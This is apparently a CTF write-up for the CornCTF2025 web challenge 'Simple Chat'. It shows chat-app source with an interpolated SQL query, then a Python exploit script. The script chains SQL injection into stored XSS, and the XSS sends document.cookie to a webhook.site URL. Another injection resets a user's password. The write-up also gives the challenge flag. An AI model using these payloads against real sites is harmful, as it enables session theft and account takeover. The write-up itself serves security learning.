---
title: CornCTF2025 | Simple Chat
published: 2025-07-08
description: Simple web application to chat with your friends! Sometimes it does funny things and it's ok like that
image: ''
tags: ["web"]
authors: ["akiidjk"]
solves: 22
points: 280
firstblood: false
category: CornCTF2025
draft: false

---




## Introduction

Okay, this is a really nice challenge. This is a pretty second CTF web challenge. It's a simple XSS with a twist.

## Source

Let's look at two parts of the **FUNDAMENTAL** code

```javascript
// filename: app.js

app.post('/api/v1/insertChat', async (req, res) => {
  const sender = req.body.sender;
  const receiver = req.body.receiver;
  var message = req.body.message;

  if (!FRIENDS.includes(sender) && sender !== 'admin' && sender !== 'kekw') {
    res.json({ 'status': "you can't write messages on behalf of other people." })
    return
  }

  if (!FRIENDS.includes(receiver) && receiver !== 'admin' && receiver !== 'kekw') {
    res.json({ 'status': "you can't write to nobody" })
    return;
  }

  //no XSS
  message = message.replaceAll('<', '&lt;');
  message = message.replaceAll('>', '&gt;');

  const result = await db.insertChat(sender, receiver, message);
  if (result != 0) {
    res.json({ 'status': "Couldn't insert the chat." });
    return;
  }
  const response = { 'status': 'Success' };
  res.json(response);
})

```

In the above script, we see that several checks are made for the sender and receiver when messages are inserted into chats. Most importantly, we see that the characters `<` and `>` are replaced with `&lt;` and `&gt;`, respectively, so that we cannot insert XSS directly.

```javascript
// filename: db.js

async insertChat(sender, receiver, message) {
  try {
    const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
    await this.client.query(query);
  } catch (e) {
    console.log(`Error: ${e}`)
    return 1;
  }
  return 0;
}

```

Upon analyzing the DB calls, we see that a direct query insert is made. Therefore, we can exploit an SQLi to bypass the replace check. There are also SQLi's in every db query, so we can do whatever we want, like logging in as an admin, but that wasn't really necessary.

## Solution

```python
# filename: exploit.py

#!/usr/bin/python3
import random
import string

import requests

BASE_URL = "http://localhost"
# BASE_URL = "https://simple-chat-b6eb1bef.challs.cornc.tf"
URL_HOOK = "https://webhook.site/1911a3b8-9c48-468c-a2aa-05e81cb1df93"

s = requests.Session()

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def getMessages(friend):
    r = s.get(BASE_URL + "/api/v1/fetchMessages", params={"friend[]": friend})
    if r.status_code != 200:
        print("Error getting messages")
        return None
    return r.json()

def getProfile():
    r = s.get(BASE_URL + "/api/v1/profile")
    if r.status_code != 200:
        print("Error getting profile")
        return None
    return r.json()

def login(username,password):
    r = s.post(BASE_URL + "/api/v1/login", json={"username": username, "password": password},headers={"Origin":"http://localhost"})
    if r.status_code != 200:
        print("Error login")
        return None
    return r.json()

def insertChat(sender,receiver,message):
    r = s.post(BASE_URL + "/api/v1/insertChat", json={"sender": sender, "receiver": receiver, "message": message})
    if r.status_code != 200:
        print("Error inserting chat")
        return None
    return r.json()

def build_payload_xss(sender, target_user, xss_url):
    js_payload = f"""img src="a" onerror="fetch('{URL_HOOK}?q='+document.cookie)");"""
    sql_payload = "chr(60)||'" + js_payload.replace("'", "''") + "'||chr(62)"
    injected_query = f"""aaa'); INSERT INTO chat(sender, receiver, message) VALUES ('{target_user}','admin',{sql_payload});-- """
    return injected_query

def ping():
    r = s.get(BASE_URL + "/ping",params={"friend":"Val"})
    if r.status_code != 200:
        print("Error pinging")
        return None
    return r.json()

def main():
    login("kekw", "kekw")
    print(s.cookies["connect.sid"])
    print(getMessages("Val"))
    print(getProfile())
    print(insertChat("kekw", "Val", "aaa'); UPDATE users SET password='cookie' WHERE username='Val'; --"))
    print(insertChat("kekw", "Val", build_payload_xss("kekw", "Val", URL_HOOK)))
    print(ping())

    # Wait for the XSS to trigger and send the cookie to the webhook


if __name__ == "__main__":
	main()


# goodluck by @akiidjk
```

flag: :spoiler[corn{d0ubl3_uns4n1t1z4tion_d4mnnnn_f45a85f9d6346d8b}]
